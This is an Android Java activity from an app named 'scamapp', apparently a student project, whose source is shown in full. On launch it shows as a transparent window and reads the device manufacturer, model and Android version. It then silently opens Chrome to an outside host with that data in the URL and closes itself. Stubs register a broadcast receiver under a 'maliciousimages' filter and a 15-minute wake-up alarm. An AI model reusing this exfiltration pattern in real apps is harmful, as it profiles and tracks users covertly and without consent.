package com.example.scamapp;
import androidx.appcompat.app.AppCompatActivity;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;

import java.util.Calendar;


public class MainActivity extends AppCompatActivity
{

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        setApperence();
        super.onCreate(savedInstanceState);
        String deviceName = getDeviceName();
        runChrome("?data=DeviceName:"+deviceName);
    }

    public void runChrome(String dataToSend) {

        final String url = "https://s444471.projektstudencki.pl/pass" + dataToSend;
        final Uri uri = Uri.parse("googlechrome://navigate?url=" + url);
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        intent.setPackage("com.android.chrome");
        startActivity(intent);
        finish();
    }

    public void generateNotification(){


    }

    @Override
    protected void onDestroy()
    {
        super.onDestroy();
        /* if(MyReceiver != null)
            unregisterReceiver(MyReceiver); */
        // send notification!

    }


    public void setApperence(){
        setTheme(R.style.TransparentActivityTheme);
        View rootView = getWindow().getDecorView().getRootView();
        rootView.setBackgroundResource(R.drawable.wallpaper);
    }

    public void registertheReciver(){

        IntentFilter intentFilter = new IntentFilter("com.example.maliciousimages_app");
        MyBroadcastReceiver MyReceiver = new MyBroadcastReceiver();
        registerReceiver(MyReceiver, intentFilter);
        if(intentFilter != null) {


        }

    }

    public void registerAlarm() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, MyBroadcastReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this,
                0, intent, PendingIntent.FLAG_IMMUTABLE);

        long triggerTime = System.currentTimeMillis() + (15 * 60 * 1000);
        alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
    }

    public static String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        int sdkVersion = Build.VERSION.SDK_INT;
        return manufacturer+ ","+androidVersion+","+sdkVersion+","+model;
        }
}

